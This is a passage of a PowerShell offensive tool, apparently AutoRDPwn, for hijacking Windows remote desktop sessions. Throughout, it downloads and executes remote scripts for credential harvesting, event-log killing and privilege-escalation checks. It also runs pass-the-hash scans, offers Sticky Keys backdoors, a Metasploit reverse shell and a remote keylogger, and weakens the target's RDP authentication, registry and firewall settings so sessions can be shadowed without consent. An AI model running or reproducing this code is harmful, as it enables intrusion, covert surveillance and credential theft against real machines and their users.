        netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "[i] $txt45" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }

        if($forwarding -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; & $question ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
        $rlport = $Host.UI.ReadLine() ; Write-Host ; & $question ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $rlhost = $Host.UI.ReadLine() ; Write-Host
        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rrport = $Host.UI.ReadLine() ; Write-Host ; & $question ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rrhost = $Host.UI.ReadLine()
        $remoteforward = "true" ; Write-Host ; Write-Host "[i] $txt46" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }

        if($forwarding -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; $proxy = netsh interface portproxy show all
        if(!$proxy){ Write-Host ; Write-Host "[!] $txt47" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } else { $Host.UI.RawUI.ForegroundColor = 'Gray' ; netsh interface portproxy show all ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }}

        if($forwarding -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; $proxy = netsh interface portproxy show all
        if(!$proxy){ Write-Host ; Write-Host "[!] $txt47" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } else { netsh interface portproxy reset ; Write-Host "[!] $txt48" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

        if($forwarding -like 'X'){ $input = 'x' ; continue }
        if($forwarding -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

        if($networking -like '3') { $webserver = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }

        if($networking -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
        Write-Host ; & $question ; Write-Host "$txt55" -NoNewLine -ForegroundColor Gray ; do { $scansystem = $Host.UI.ReadLine()
        if(!$scansystem) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scansystem )
        Write-Host ; & $question ; Write-Host "$txt78" -NoNewLine -ForegroundColor Gray ; do { $scanuser = $Host.UI.ReadLine()
        if(!$scanuser) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanuser )
        
        Write-Host ; & $question ; Write-Host "$txt83" -NoNewLine -ForegroundColor Gray ; do { $scanmethod = $Host.UI.ReadLine()
        if(!$scanmethod) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanmethod )
        
        if($scanmethod -like "hash") {
        Write-Host ; & $question ; Write-Host "$txt84" -NoNewLine -ForegroundColor Gray ; do { $scanpass = $Host.UI.ReadLine()
        if(!$scanpass) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanpass )}
        
        if($scanmethod -like "pass") {
        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; do { $scanpass = Read-PlainText | ConvertTo-SecureString -AsPlainText -Force
        if(!$scanpass) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanpass )}

        Write-Host ; & $question ; Write-Host "$txt85" -NoNewLine -ForegroundColor Gray ; do { $scanprotocol = $Host.UI.ReadLine()
        if(!$scanprotocol) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $scanprotocol )

        if($scanmethod -like "pass") { if ($local){ Import-Module .\Resources\Scripts\Get-NTLM.ps1 } else { 
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Get-NTLM.ps1')}
        Import-Module .\Get-NTLM ; $scanpass = ConvertFrom-SecureToPlain $scanpass ; $scanpass = Get-NTLM $scanpass }
        
        if ($local){ Import-Module .\Resources\Scripts\Check-LocalAdminHash.ps1 } else { 
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Check-LocalAdminHash.ps1')}
        Check-LocalAdminHash -Username $scanuser -PasswordHash $scanpass -CIDR $scansystem -Protocol $scanprotocol -Threads 20 ; Write-Host ; pause }

        if($networking -like 'X'){ $input = 'x' ; continue }
        if($networking -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
   
        if($module -like '4') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt11" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt12" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt61" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forensics = $Host.UI.ReadLine() ; Write-Host

        if($forensics -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; Write-Host "[!] $txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $ProgressPreference = "Continue"
        if ($local){ Import-Module .\Resources\Scripts\RDP-Caching.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/RDP-Caching.ps1')} ; explorer $env:temp\Recovered_RDP_Session
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; $ProgressPreference = "SilentlyContinue" ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; Start-Sleep -milliseconds 2000 }

        if($forensics -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\ListAllUsers.ps1 | Set-Clipboard ; Get-Clipboard } else { 
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/ListAllUsers.ps1') | Set-Clipboard ; Get-Clipboard }
        ListAllUsers | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
        
        if($forensics -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\SessionGopher.ps1 } else { 
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/SessionGopher.ps1')}
        Invoke-SessionGopher -Thorough | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }

        if($forensics -like 'X'){ $input = 'x' ; continue }
        if($forensics -in '1','2','3','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
        
        if($module -like '5') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Metasploit Reverse Shell" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Keylogger" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $backdoor = $Host.UI.ReadLine() ; Write-Host
        
        if($backdoor -like '1') { $sticky = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }

        if($backdoor -like '2') { $metasploit = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 
        $metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
        & $question ; Write-Host "$txt65" -NoNewLine -ForegroundColor Gray ; $metahost = $Host.UI.ReadLine() ; Write-Host
        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $metaport = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Write-Host ; Write-Host "[!] $txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/handler"
        Write-host "set payload windows/shell/reverse_tcp" ; Write-host "set LHOST $metahost" ; Write-host "set LPORT $metaport"  
        Write-host "exploit" ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }

        if($backdoor -like '3') { $getkeys = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }

        if($backdoor -like 'X'){ $input = 'x' ; continue }
        if($backdoor -in '1','2','3','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

        if($module -like '6') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt70" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt71" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt72" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $privesc = $Host.UI.ReadLine() ; Write-Host

        if($privesc -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        if ($local){ Import-Module .\Resources\Scripts\Chachi-Enumerator.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Chachi-Enumerator.ps1')}
        Comprueba-Todo ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
        
        if($privesc -like '2'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        if ($local){ Import-Module .\Resources\Scripts\Sherlock.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Sherlock.ps1')}
        Find-AllVulns ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
        
        if($privesc -like '3'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        if ($local){ Import-Module .\Resources\Scripts\Invoke-PrivescCheck.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PrivescCheck.ps1')}
        Invoke-PrivescCheck ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
        
        if($privesc -like 'X'){ $input = 'x' ; continue }
        if($privesc -in '1','2','3','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

        if($module -like '7') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt18" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt62" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt67" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt79" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $othermodule = $Host.UI.ReadLine() ; Write-Host

        if($othermodule -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
        if ($local){ Import-Module .\Resources\Scripts\Invoke-Phant0m.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Phant0m.ps1')}
        Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
        
        if($othermodule -like '2'){ $vncserver = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
        
        if($othermodule -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
        do { & $question ; Write-Host "$txt73" -NoNewLine -ForegroundColor Gray ; $externalscript = $Host.UI.ReadLine() ; Write-Host
        if(!$externalscript) { Write-Host "[!] $txt6" -ForegroundColor Red ; Write-Host ; Start-Sleep -milliseconds 2000 }}
        until ( $externalscript) ; & $question ; Write-Host "$txt74" -NoNewLine -ForegroundColor Gray ; $externalfunction = $Host.UI.ReadLine() 
        $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
        if($externalscript -like 'http*') { Invoke-Expression (New-Object Net.WebClient).DownloadString("$externalscript") } 
        else { Import-Module $externalscript } ; if($externalfunction){ Invoke-Expression $externalfunction }
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }

        if($othermodule -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Set-Location $env:temp
        Write-Host ; & $question ; Write-Host "$txt78" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
        & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser ; $user = $currentuser }
        do { Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force
        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $PlainTextPassword )
        Write-Host ; Write-Host "[+] $txt80" -ForegroundColor Blue ; Start-Sleep -milliseconds 2000 ; if ($local){ Import-Module .\Resources\Scripts\Invoke-RunAs.ps1 } else {
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-RunAs.ps1')}
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement ; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:computername)
        $validate = $obj.ValidateCredentials($user, $PlainTextPassword) ; if ($validate -eq $true ){ Write-Host ; Write-Host "[i] $txt82" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
        if ($local) { ./RunAs.exe -u $user -p $PlainTextPassword -e "powershell Start-Process powershell -NoNewWindow -WorkingDirectory $localpath -ArgumentList $PSCommandPath $args" ; del ./RunAs.exe ; exit }}
        if (!$local) { ./RunAs.exe -u $user -p $PlainTextPassword -e "powershell Invoke-WebRequest -UseBasicParsing https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1" ; del ./RunAs.exe ; exit }
        else { Write-Host ; Write-Host "[!] $txt81" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; del ./RunAs.exe }}

        if($othermodule -like 'X'){ $input = 'x' ; continue }
        if($othermodule -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

        if($module -like 'X'){ $input = 'x' ; continue } ; if($module -in '1','2','3','4','5','6','7','m','x') { $null }
        else { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

        'X' { continue }
        default { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}} until ($input -in '1','2','3','4','5','6','7','X')

   if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force }
   $Host.UI.RawUI.ForegroundColor = 'Green' ; if($user){ $user = Resolve-TargetUser $user $computer }
   $wsvc = Get-Service WinRM -ErrorAction SilentlyContinue ; if(!$wsvc -or $wsvc.Status -ne 'Running' -or $wsvc.StartType -ne 'Automatic'){ winrm quickconfig -force 2>&1> $null }
   if((Get-Item WSMan:\localhost\Client\Trustedhosts -ErrorAction SilentlyContinue).Value -ne '*'){ Set-Item wsman:\localhost\client\trustedhosts * -Force 2>&1> $null }
   Get-NetConnectionProfile -ErrorAction SilentlyContinue | Where-Object { $_.NetworkCategory -ne 'Private' } | ForEach-Object { Set-NetConnectionProfile -InterfaceIndex $_.InterfaceIndex -NetworkCategory Private -ErrorAction SilentlyContinue }
   Write-Host "[i] Conectando con $computer" -NoNewLine -ForegroundColor Green ; $sessionoption = New-PSSessionOption -OpenTimeout 8000 -CancelTimeout 3000 -OperationTimeout 60000 ; $connectdeadline = (Get-Date).AddSeconds(30) ; $failopen = 0 ; $lasterr = $null
   if(!$RDP){ do { Write-Host "." -NoNewLine ; if(Test-RemoteTcp -Computer $computer -Port 5985 -TimeoutMs 1300){
   try { if(!$user){ $RDP = New-PSSession -Computer $computer -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } else { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } } catch { $RDP = $null ; $lasterr = $_.Exception.Message ; $failopen++ ; Start-Sleep -Milliseconds 700 } }
   else { $failopen = 0 ; Start-Sleep -Milliseconds 1100 }} until ($RDP -or $failopen -ge 3 -or (Get-Date) -gt $connectdeadline) }
   Write-Host ; if(!$RDP){ if($lasterr){ Write-Host "[!] Conexion WinRM fallida en ${computer}: $lasterr" -ForegroundColor Red ; Write-Host "[i] Comprueba la clave y el formato de usuario (DOMINIO\usuario o .\usuario para cuentas locales)" -ForegroundColor DarkGray }
else { Write-Host "[!] WinRM (5985) sin respuesta en $computer.. el modo espejo no funcionara" -ForegroundColor Red ; Get-AttackHint -Computer $computer } } ; $session = $RDP ; if ($session){ $attack = "true"

        do { $seeshadow = "see", "view", "ver", "regarder", "siehe", "vedere", "увидеть", "1" ; $controlshadow = "control", "controlar", "contrôle", "kontrolle", "controllo", "контроль", "2"
        $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $stickyshadow = "sticky" ; $inputoption = "sticky"} elseif($shadowoption -like '-shadow') { $inputoption=$args[7] }
        else { if($hash){ $user = $null } ; Write-Host
        Write-Host "  [" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Ver la sesion remota (solo lectura)" -ForegroundColor Gray
        Write-Host "  [" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Controlar el equipo (raton y teclado)" -ForegroundColor Gray
        & $question ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $inputoption = $Host.UI.ReadLine() ; if(!$inputoption){ $inputoption = "1" }}

        if($inputoption -in $seeshadow) { $control = "false" ; Write-Host
        invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
        Write-Host "[+] $using:txt30" -ForegroundColor Blue }}

        if($inputoption -in $controlshadow) { $control = "true" ; Write-Host
        invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
        Write-Host "[+] $using:txt31" -ForegroundColor Blue }}

        if($inputoption -in $stickyshadow) { $control = "true" ; Write-Host
        Write-Host "[+] $txt34" -ForegroundColor Blue }

        if(!$control) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ($control)

    invoke-command -session $RDP[0] -scriptblock {
    $AllowAnonymousCallback = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM").AllowAnonymousCallback
    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM" -Name AllowAnonymousCallback -Value 1 -PropertyType DWORD -Force 2>&1> $null
    $DisableRestrictedAdmin = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").DisableRestrictedAdmin
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force 2>&1> $null
    $AutoShareWks = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters").AutoShareWks
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name AutoShareWks -Value 1 -PropertyType DWORD -Force 2>&1> $null
    $AutoShareServer = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters").AutoShareServer
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name AutoShareServer -Value 1 -PropertyType DWORD -Force 2>&1> $null
    $AllowRemoteRPC = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server").AllowRemoteRPC
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name AllowRemoteRPC -Value 1 -PropertyType DWORD -Force 2>&1> $null
    $fDenyTSConnections = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server").fDenyTSConnections
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0 -PropertyType DWORD -Force 2>&1> $null
    $fAllowToGetHelp = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance").fAllowToGetHelp
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -Name fAllowToGetHelp -Value 1 -PropertyType DWORD -Force 2>&1> $null
    $fAllowFullControl = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance").fAllowFullControl
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -Name fAllowFullControl -Value 1 -PropertyType DWORD -Force 2>&1> $null
    $SecurityLayer = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp").SecurityLayer
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name SecurityLayer -Value 0 -PropertyType DWORD -Force 2>&1> $null
    $UserAuthentication = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp").UserAuthentication
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0 -PropertyType DWORD -Force 2>&1> $null
    $LocalAccountTokenFilterPolicy = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").LocalAccountTokenFilterPolicy
    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWORD -Force 2>&1> $null
    netsh advfirewall firewall delete rule name="AutoRDPwn-Shadow-3389" 2>&1> $null
    netsh advfirewall firewall add rule name="AutoRDPwn-Shadow-3389" dir=in action=allow protocol=TCP localport=3389 profile=any enable=yes 2>&1> $null
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" -Force 2>&1> $null
    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" -Name AllowEncryptionOracle -Value 2 -PropertyType DWORD -Force 2>&1> $null }
    New-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" -Force 2>&1> $null
    New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" -Name AllowEncryptionOracle -Value 2 -PropertyType DWORD -Force 2>&1> $null

    Write-Host ; Write-Host "[+] $txt32" -ForegroundColor Blue ; $remoteinfo = invoke-command -session $RDP[0] -scriptblock { [pscustomobject]@{ host = $env:computername ; caption = (Get-WmiObject -class Win32_OperatingSystem).Caption } } ; $hostname = $remoteinfo.host ; $version = $remoteinfo.caption
    if(!$hostname){ $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername } ; $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption }}
    Write-Host ; Write-Host "[i] $txt33" -NoNewLine ; Write-Host $(if($hostname){$hostname.tolower()}) -ForegroundColor Gray ;  if($hash){ cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null }
    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host

    if($smbshell){ invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { 
